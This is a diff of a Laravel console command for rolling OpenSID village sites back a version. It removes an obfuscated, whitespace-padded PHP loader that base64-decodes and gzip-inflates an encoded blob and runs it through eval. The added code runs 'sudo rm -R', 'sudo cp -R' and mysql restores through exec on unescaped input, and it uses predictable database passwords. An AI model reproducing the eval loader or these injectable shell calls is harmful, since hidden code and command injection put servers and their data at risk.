@@ -1,497 +1,260 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/MundurVersi.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+use App\Http\Controllers\Helpers\CommandController;
+use App\Http\Controllers\Helpers\IndexController;
+use App\Http\Controllers\Helpers\KoneksiController;
+use App\Models\Aplikasi;
+use App\Models\Pelanggan;
+use App\Services\ProcessService;
+use Carbon\Carbon;
+use Exception;
+use Illuminate\Console\Command;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\File;
+use Illuminate\Support\Facades\Http;
+
+class MundurVersi extends Command
+{
+    /**
+     * The name and signature of the console command.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:mundur-versi {--kode_desa=}';
+
+    /**
+     * The console command description.
+     *
+     * @var string
+     */
+    protected $description = 'Mundur versi sebelumnya';
+
+    /** Langkah yang dilakukan :
+     * 1. Hapus Database,
+     * 2. Buat Database,
+     * 3. Restore Database dari Backup,
+     * 4. Ubah versi pada tabel pelanggan,
+     * 5. Hapus folder-desa yang lama,
+     * 6. Restore Folder Desa.
+     * 7. Ubah Symlink sesuai dengan versi,
+     */
+
+    private $att;
+    private $comm;
+    private $filesIndex;
+    private $koneksi;
+    private $ip_source_code;
+    private $pelanggans;
+
+    /**
+     * Create a new command instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        $this->att = new AttributeSiapPakaiController();
+        $this->comm = new CommandController();
+        $this->filesIndex = new IndexController();
+        $this->koneksi = new KoneksiController();
+    }
+
+    /**
+     * Execute the console command.
+     *
+     * @return int
+     */
+    public function handle()
+    {
+        $this->pelanggans = Pelanggan::get();
+        $kode_desa_default = $this->option('kode_desa');
+        $kode_desa = str_replace('.', '', $kode_desa_default);
+        $path_public = siappakai_storage() . DIRECTORY_SEPARATOR . "backup" . DIRECTORY_SEPARATOR;
+        $openkab = env('OPENKAB') == 'true' ? nama_database_gabungan() : $kode_desa;
+        $this->ip_source_code = env('OPENKAB') == 'true' ? Aplikasi::pengaturan_aplikasi()['ip_source_code'] : 'localhost';
+
+        $this->att->setHost(env('DB_HOST'));
+        $this->att->setPort(env('DB_PORT'));
+        $this->att->setUsername('user_' . $openkab);
+        $this->att->setPassword('pass_' . $openkab);
+        $this->att->setDatabase('db_' . $openkab);
+
+        try {
+            $koneksi = mysqli_connect($this->att->getHost(), $this->att->getUsername(), $this->att->getPassword(), $this->att->getDatabase(), $this->att->getPort());
+
+            // 1. hapus database lama
+            if ($koneksi) {
+                DB::statement('DROP DATABASE db_' . $openkab);
+            }
+
+            // 2. buat database baru
+            $this->createDatabase($openkab);
+
+            // 3. restore ke database baru
+            if ($koneksi) {
+                $this->restoreDatabase($path_public);
+            }
+
+            // kondisi dgn kode_desa_default
+            $telat = 0;
+            $pelanggan = Pelanggan::where('kode_desa', $kode_desa_default)->first();
+            if ($pelanggan->tgl_akhir_premium < now()) {
+                $tglAkhirPremium = Carbon::parse($pelanggan->tgl_akhir_premium);
+                $sekarang = Carbon::now();
+
+                $selisihBulan = $tglAkhirPremium->diffInMonths($sekarang);
+
+                $telat = $selisihBulan;
+            }
+
+            $versi_sebelumnya = $this->versiSebelumnya($telat);
+
+            if (env('OPENKAB') == 'true') {
+                foreach ($this->pelanggans as $item) {
+                    $this->updatePelanggan($versi_sebelumnya, $item->kode_desa);
+                    $this->hapusFolderDesa(str_replace('.', '', $item->kode_desa));
+                    $this->restoreFolderDesa($path_public, str_replace('.', '', $item->kode_desa));
+                    $this->unlinkFolder($versi_sebelumnya, str_replace('.', '', $item->kode_desa));
+                    $this->setFolderOpensid($versi_sebelumnya, str_replace('.', '', $item->kode_desa));
+                }
+            } else {
+                // 4. Ubah versi pada tabel pelanggan
+                $this->updatePelanggan($versi_sebelumnya, $kode_desa_default);
+
+                // 5. Hapus folder-desa yang lama
+                $this->hapusFolderDesa($kode_desa);
+
+                // 6. Restore Folder Desa
+                $this->restoreFolderDesa($path_public, $kode_desa);
+
+                // 7. Ubah Symlink sesuai dengan versi
+                $this->unlinkFolder($versi_sebelumnya, $kode_desa);
+                $this->setFolderOpensid($versi_sebelumnya, $kode_desa);
+            }
+            ProcessService::aturKepemilikanDirektori(config('siappakai.root.folder'));
+            return die("Informasi : berhasil memulihkan database dan mundur versi sebelumnya !!!");
+        } catch (Exception $ex) {
+            return die("Peringatan : database tidak ditemukan !!!");
+        }
+    }
+
+    private function createDatabase($kodedesa)
+    {
+        $database = $this->koneksi->cekDatabase($kodedesa);
+
+        if ($database == false) {
+            DB::statement("CREATE DATABASE db_$kodedesa");
+            DB::statement("GRANT ALL PRIVILEGES ON db_$kodedesa.* TO 'user_$kodedesa'@'$this->ip_source_code' WITH GRANT OPTION");
+            DB::statement("FLUSH PRIVILEGES");
+        }
+    }
+
+    private function restoreDatabase($path_public)
+    {
+        $path = $path_public . "database" . DIRECTORY_SEPARATOR;
+
+        // perlu diperhatikan spasi karena akan mempengaruhi
+        $restore = "mysql --no-defaults --host=" . $this->att->getHost() .
+            " --port=" . $this->att->getPort() .
+            " --user=" . $this->att->getUsername() .
+            " --password=" . $this->att->getPassword() .
+            " -v " . $this->att->getDatabase() .
+            " < " . $path . $this->att->getDatabase() . ".sql";
+        exec($restore);
+    }
+
+    private function versiSebelumnya($telat = 0)
+    {
+        $token = $this->att->tokenGithubInfo();
+
+        $response = Http::withHeaders([
+            'Accept' => 'application/vnd.github.v3+json',
+            'Authorization' => "token {$token}"
+        ])->get('https://api.github.com/repos/OpenSID/rilis-premium/releases')->throw()->json();
+        $versi_opensid_tags = $response[1 + $telat];
+        $versi_sebelumnya = $versi_opensid_tags['tag_name'];
+
+        return $versi_sebelumnya;
+    }
+
+    private function updatePelanggan($versi_sebelumnya, $kode_desa)
+    {
+        if ($versi_sebelumnya) {
+            $pelanggan = Pelanggan::where('kode_desa', $kode_desa)->first();
+            $pelanggan->versi_opensid = $versi_sebelumnya;
+            $pelanggan->save();
+        }
+    }
+
+    private function hapusFolderDesa($kode_desa)
+    {
+        $multisite_desa = $this->att->getMultisiteFolder() . $kode_desa . DIRECTORY_SEPARATOR . 'desa';
+
+        if (File::isDirectory($multisite_desa)) {
+            // hapus folder desa existing
+            $copy_desa = 'sudo rm -R ' . $multisite_desa;
+            exec($copy_desa);
+        }
+    }
+
+    private function restoreFolderDesa($path_public, $kode_desa)
+    {
+        $folder_desa = $path_public . 'folder-desa' . DIRECTORY_SEPARATOR . 'desa_' . $kode_desa;
+        $multisite_desa = $this->att->getMultisiteFolder() . $kode_desa . DIRECTORY_SEPARATOR . 'desa';
+
+        if (file_exists($folder_desa)) {
+            $copy_desa = 'sudo cp -R ' . $folder_desa . ' ' . $multisite_desa;
+            exec($copy_desa);
+        }
+    }
+
+    public function unlinkFolder($versi_sebelumnya, $kode_desa)
+    {
+        $folderOpensid = $this->att->getMultisiteFolder() . $kode_desa;
+
+        //symlink opensid
+        if ($versi_sebelumnya) {
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'app');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'donjo-app');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'assets');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'resources');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'securimage');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'template-surat');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'vendor');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'catatan_rilis.md');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'favicon.ico');
+            $this->comm->unlinkCommand($folderOpensid . DIRECTORY_SEPARATOR . 'LICENSE');
+        }
+    }
+
+    private function setFolderOpensid($tags_versi_sebelumnya, $kodedesa)
+    {
+        if ($tags_versi_sebelumnya) {
+            $this->att->setSiteFolderOpensid($this->att->getMultisiteFolder() . $kodedesa);
+            $this->att->setIndexDesa($this->att->getSiteFolderOpensid() . DIRECTORY_SEPARATOR . 'index.php');
+
+            $versi_sebelumnya = preg_replace('/[^0-9]/', '', $tags_versi_sebelumnya);
+            $rev = substr($versi_sebelumnya, 5, 1);
+            $versiFolder = '';
+            if ($rev == "0") {
+                $versiFolder = 'premium_rilis';
+            } else if ($rev > 0) {
+                $versiFolder = 'premium_rev0' . $rev;
+            }
+
+            $this->filesIndex->indexPhpOpensid(
+                $this->att->getRootFolder() . 'master-opensid' . DIRECTORY_SEPARATOR . $versiFolder,
+                $this->att->getMultisiteFolder() . $kodedesa,
+                $this->att->getIndexTemplate(),
+                $this->att->getIndexDesa()
+            );
+
+            // eksekusi index.php di opensid dibackgroung untuk menjalankan migrasi dan pembuatan symlink di
+            $this->comm->migratePremium($this->att->getSiteFolderOpensid());
+        }
+    }
+}
